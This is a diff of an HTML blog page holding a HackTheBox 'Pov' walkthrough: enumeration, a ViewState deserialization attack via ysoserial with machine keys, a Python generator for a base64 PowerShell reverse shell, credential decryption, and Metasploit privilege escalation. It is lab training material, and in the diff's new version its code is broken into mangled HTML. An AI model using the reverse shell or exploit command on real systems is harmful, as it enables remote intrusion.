@@ -48,14 +48,6 @@
 <main class="page-content" aria-label="Content">
       <div class="wrapper">
         
-  <div class="author-box">
-
-<div class="description">This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i've developed
-</div>
-
-</div>
-
-
 <div class="post">
   <h1 class="post-title">Pov-Windows-Medium</h1>
   
@@ -69,123 +61,123 @@
 <p>HackTheBox: Hard</p>
 
 <h2 id="1-enumeration">1: Enumeration</h2>
-
+<p><br /><br /></p>
 <ul>
-  <li>nmap scanning</li>
+  <li>nmap scanning
+<br /><br />
+<img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled.png" alt="Untitled" />
+<br /><br />
+We can find a http service on 80 port
+<br /><br />
+<img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_1.png" alt="Untitled" />
+<br /><br /></li>
+  <li>Use gobuster trying to find a subdomain using vhost to check if the subdomain exists
+<br /><br />
+<img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_2.png" alt="Untitled" />
+<br /><br />
+A subdomain found
+<br /><br />
+<img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_3.png" alt="Untitled" />
+<br /><br />
+    <h2 id="2-user-flag">2: User flag</h2>
+    <p><br /><br />
+We can download a CV, but what happens if we change the file to a route of a web site configuration /web_config
+<br /><br />
+<img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_4.png" alt="Untitled" />
+<br /><br />
+There is some information and _VIEWSTATE parameter has a vulnerability
+<br /><br />
+<img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_5.png" alt="Untitled" />
+<br /><br />
+More info about this vulnerability on _Viewstate
+<br /><br />
+<a href="https://www.notion.so/Back-end-37b97a6f88e54ee6992f6741a33799f8?pvs=21">Back-end</a>
+<br /><br />
+We use this script to create a reverse powershell with base64 encoded
+<br /><br />
+```bash
+#!/usr/bin/env python3
+#</p>
+    <h1 id="generate-reverse-powershell-cmdline-with-base64-encoded-args">generate reverse powershell cmdline with base64 encoded args</h1>
+    <p>#</p>
+  </li>
 </ul>
 
-<p><img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled.png" alt="Untitled" /></p>
+<p>import sys
+import base64</p>
 
-<p>We can find a http service on 80 port</p>
+<p>def help():
+    print(“USAGE: %s IP PORT” % sys.argv[0])
+    print(“Returns reverse shell PowerShell base64 encoded cmdline payload connecting to IP:PORT”)
+    exit()</p>
 
-<p><img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_1.png" alt="Untitled" /></p>
-
-<ul>
-  <li>Use gobuster trying to find a subdomain using vhost to check if the subdomain exists</li>
-</ul>
-
-<p><img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_2.png" alt="Untitled" /></p>
-
-<p>A subdomain found</p>
-
-<p><img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_3.png" alt="Untitled" /></p>
-
-<h2 id="2-user-flag">2: User flag</h2>
-
-<p>We can download a CV, but what happens if we change the file to a route of a web site configuration /web_config</p>
-
-<p><img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_4.png" alt="Untitled" /></p>
-
-<p>There is some information and _VIEWSTATE parameter has a vulnerability</p>
-
-<p><img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_5.png" alt="Untitled" /></p>
-
-<p>More info about this vulnerability on _Viewstate</p>
-
-<p><a href="https://www.notion.so/Back-end-37b97a6f88e54ee6992f6741a33799f8?pvs=21">Back-end</a></p>
-
-<p>We use this script to create a reverse powershell with base64 encoded</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python3</span>
-<span class="c">#</span>
-<span class="c"># generate reverse powershell cmdline with base64 encoded args</span>
-<span class="c">#</span>
-
-import sys
-import <span class="nb">base64
-
-</span>def <span class="nb">help</span><span class="o">()</span>:
-    print<span class="o">(</span><span class="s2">"USAGE: %s IP PORT"</span> % sys.argv[0]<span class="o">)</span>
-    print<span class="o">(</span><span class="s2">"Returns reverse shell PowerShell base64 encoded cmdline payload connecting to IP:PORT"</span><span class="o">)</span>
-    <span class="nb">exit</span><span class="o">()</span>
-    
-try:
-    <span class="o">(</span>ip, port<span class="o">)</span> <span class="o">=</span> <span class="o">(</span>sys.argv[1], int<span class="o">(</span>sys.argv[2]<span class="o">))</span>
+<p>try:
+    (ip, port) = (sys.argv[1], int(sys.argv[2]))
 except:
-    <span class="nb">help</span><span class="o">()</span>
+    help()</p>
 
-<span class="c"># payload from Nikhil Mittal @samratashok</span>
-<span class="c"># https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3</span>
-<span class="c">#1. It creates a TCP client in powershell </span>
-<span class="c">#2. Creates a data flow used to comunication with the server</span>
-<span class="c">#3. Prepare an array to save recieve data</span>
-<span class="c">#4. We have a while loop to keep the connection</span>
-<span class="c">#5. Convert bytes to text</span>
-<span class="c">#6. Execute data using iex</span>
-<span class="c">#7. Save the output of the command</span>
-<span class="c">#8. Convert to bytes</span>
-<span class="c">#9. Send bytes to data flow</span>
-<span class="c">#10. Close connection</span>
-payload <span class="o">=</span> <span class="s1">'$client = New-Object System.Net.Sockets.TCPClient("%s",%d);
+<h1 id="payload-from-nikhil-mittal-samratashok">payload from Nikhil Mittal @samratashok</h1>
+<h1 id="httpsgistgithubcomegre55c058744a4240af6515eb32b2d33fbed3">https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3</h1>
+<p>#1. It creates a TCP client in powershell 
+#2. Creates a data flow used to comunication with the server
+#3. Prepare an array to save recieve data
+#4. We have a while loop to keep the connection
+#5. Convert bytes to text
+#6. Execute data using iex
+#7. Save the output of the command
+#8. Convert to bytes
+#9. Send bytes to data flow
+#10. Close connection
+payload = ‘$client = New-Object System.Net.Sockets.TCPClient(“%s”,%d);
 $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
 $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
 $sendback = (iex $data 2&gt;&amp;1 | Out-String );
-$sendback2 = $sendback + "PS " + (pwd).Path + "&gt; ";
+$sendback2 = $sendback + “PS “ + (pwd).Path + “&gt; “;
 $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
 $stream.Write($sendbyte,0,$sendbyte.Length);
 $stream.Flush()};
-$client.Close()'</span>
-<span class="c">#Take a commands chain  and replace their parts with the ip and port given</span>
-payload <span class="o">=</span> payload % <span class="o">(</span>ip, port<span class="o">)</span>
+$client.Close()’
+#Take a commands chain  and replace their parts with the ip and port given
+payload = payload % (ip, port)</p>
 
-<span class="c">#We enconde the payload to utf16 because it is the default encode chain</span>
-<span class="c">#The is encode to base 64</span>
-<span class="c">#Finally we encode to UNICODE which helps to limit the characters</span>
-cmdline <span class="o">=</span> <span class="s2">"powershell -e "</span> + base64.b64encode<span class="o">(</span>payload.encode<span class="o">(</span><span class="s1">'utf16'</span><span class="o">)[</span>2:]<span class="o">)</span>.decode<span class="o">()</span>
+<p>#We enconde the payload to utf16 because it is the default encode chain
+#The is encode to base 64
+#Finally we encode to UNICODE which helps to limit the characters
+cmdline = “powershell -e “ + base64.b64encode(payload.encode(‘utf16’)[2:]).decode()</p>
 
-print<span class="o">(</span>cmdline<span class="o">)</span>
+<p>print(cmdline)</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;br/&gt;&lt;br/&gt;
+![Untitled](/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_6.png)
+&lt;br/&gt;&lt;br/&gt;
+```bash
+./ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "yourpaload" --path="/portfolio/default.aspx" --appath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
 </code></pre></div></div>
-
-<p><img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_6.png" alt="Untitled" /></p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./ysoserial.exe <span class="nt">-p</span> ViewState <span class="nt">-g</span> TypeConfuseDelegate <span class="nt">-c</span> <span class="s2">"yourpaload"</span> <span class="nt">--path</span><span class="o">=</span><span class="s2">"/portfolio/default.aspx"</span> <span class="nt">--appath</span><span class="o">=</span><span class="s2">"/"</span> <span class="nt">--decryptionalg</span><span class="o">=</span><span class="s2">"AES"</span> <span class="nt">--decryptionkey</span><span class="o">=</span><span class="s2">"74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"</span> <span class="nt">--validationalg</span><span class="o">=</span><span class="s2">"SHA1"</span> <span class="nt">--validationkey</span><span class="o">=</span><span class="s2">"5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"</span>
-</code></pre></div></div>
-
+<p><br /><br /></p>
 <ul>
-  <li><strong><code class="language-plaintext highlighter-rouge">./ysoserial.exe</code></strong>: :  Tool used to deserialization attacks</li>
-  <li><strong><code class="language-plaintext highlighter-rouge">-p ViewState</code></strong>: Specifies the payload type</li>
-  <li><strong><code class="language-plaintext highlighter-rouge">-g TypeConfuseDelegate</code></strong>: Specifies the gadget type. Gadget chains are sequences of classes and methods that when serialized and deserialized, lead to arbitrary code execution.This gadget type targets a broader range of scenarios where deserialization of objects with delegate properties is performed.</li>
-  <li><strong><code class="language-plaintext highlighter-rouge">--path="/portfolio/default.aspx"</code></strong>: Specifies the path to the ASPX file where the ViewState will be injected.</li>
-  <li><strong><code class="language-plaintext highlighter-rouge">--appath="/"</code></strong>: Specifies the application path. In this case, it’s set to the root path (“/”) of the web application.Ty</li>
+  <li><strong><code class="language-plaintext highlighter-rouge">./ysoserial.exe</code></strong>: :  Tool used to deserialization attacks<br /><br /></li>
+  <li><strong><code class="language-plaintext highlighter-rouge">-p ViewState</code></strong>: Specifies the payload type<br /><br /></li>
+  <li><strong><code class="language-plaintext highlighter-rouge">-g TypeConfuseDelegate</code></strong>: Specifies the gadget type. Gadget chains are sequences of classes and methods that when serialized and deserialized, lead to arbitrary code execution.This gadget type targets a broader range of scenarios where deserialization of objects with delegate properties is performed.<br /><br /></li>
+  <li><strong><code class="language-plaintext highlighter-rouge">--path="/portfolio/default.aspx"</code></strong>: Specifies the path to the ASPX file where the ViewState will be injected.<br /><br /></li>
+  <li><strong><code class="language-plaintext highlighter-rouge">--appath="/"</code></strong>: Specifies the application path. In this case, it’s set to the root path (“/”) of the web application.Ty<br /><br /></li>
 </ul>
 
-<p><img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_7.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_8.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_9.png" alt="Untitled" /></p>
-
-<p>Send the revshell and obtain the answer</p>
-
-<p><img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_10.png" alt="Untitled" /></p>
-
-<p>On user sfitz we found some creds to make a lateral movement but they are encoded so lets get the password</p>
-
-<p><img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_11.png" alt="Untitled" /></p>
-
-<p>We moved to another route where there are write permissions</p>
-
+<p><img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_7.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_8.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_9.png" alt="Untitled" />
+<br /><br />
+Send the revshell and obtain the answer
+<br /><br />
+<img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_10.png" alt="Untitled" />
+<br /><br />
+On user sfitz we found some creds to make a lateral movement but they are encoded so lets get the password
+<br /><br />
+<img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_11.png" alt="Untitled" />
+<br /><br />
+We moved to another route where there are write permissions
+<br /><br /></p>
 <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">echo</span><span class="w"> </span><span class="s2">""</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">pass.txt</span><span class="w">
 </span><span class="c">#Read content</span><span class="w">
 </span><span class="nv">$EncryptedeString</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-content</span><span class="w"> </span><span class="o">.</span><span class="nx">\pass.txt</span><span class="w">
@@ -196,43 +188,47 @@ print<span class="o">(</span>cmdline<span class="o">)</span>
 </span><span class="c">#Function to print the password</span><span class="w">
 </span><span class="n">echo</span><span class="w"> </span><span class="nv">$Credential</span><span class="o">.</span><span class="nf">GetNetworkCredential</span><span class="p">()</span><span class="o">.</span><span class="nf">password</span><span class="w">
 </span></code></pre></div></div>
+<p><br /><br /></p>
 
-<p><img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_12.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_13.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_14.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_15.png" alt="Untitled" /></p>
-
+<p><img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_12.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_13.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_14.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_15.png" alt="Untitled" />
+<br /><br /></p>
 <h2 id="3-priv-esc">3: Priv esc</h2>
-
-<p><img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_image.png" alt="image.png" /></p>
-
-<p>Priv esc is easy, using PS command we realize there’s a winlogon service running as a 548 PID</p>
-
-<p><img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_16.png" alt="Untitled" /></p>
-
-<p>So we create a shell using metasploit</p>
-
-<p><img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_17.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_18.png" alt="Untitled" /></p>
-
-<p>Set the environment to receive the connection</p>
-
-<p><img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_19.png" alt="Untitled" /></p>
-
-<p>Execute the malicious .exe using user creds to send the connection</p>
-
-<p><img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_20.png" alt="Untitled" /></p>
-
-<p>Here we have just a user shell, but thanks to metasploit we can migrate shell through process, we use PS here again to review the PID of winlogon which is a process that normally runs as root permissions</p>
-
-<p><img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_21.png" alt="Untitled" /></p>
-
-<p>machine pwned!!
+<p><br /><br />
+<img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_image.png" alt="image.png" />
+<br /><br />
+Priv esc is easy, using PS command we realize there’s a winlogon service running as a 548 PID 
+<br /><br />
+<img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_16.png" alt="Untitled" />
+<br /><br />
+So we create a shell using metasploit
+<br /><br />
+<img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_17.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_18.png" alt="Untitled" />
+<br /><br />
+Set the environment to receive the connection
+<br /><br />
+<img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_19.png" alt="Untitled" />
+<br /><br />
+Execute the malicious .exe using user creds to send the connection
+<br /><br />
+<img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_20.png" alt="Untitled" />
+<br /><br />
+Here we have just a user shell, but thanks to metasploit we can migrate shell through process, we use PS here again to review the PID of winlogon which is a process that normally runs as root permissions
+<br /><br />
+<img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_21.png" alt="Untitled" />
+<br /><br />
+machine pwned!!
 <script src="/assets/js/matrix-overlay.js"></script></p>
+
+<link rel="stylesheet" href="/assets/css/imagesstyle.css" />
+
 
 </div>
 
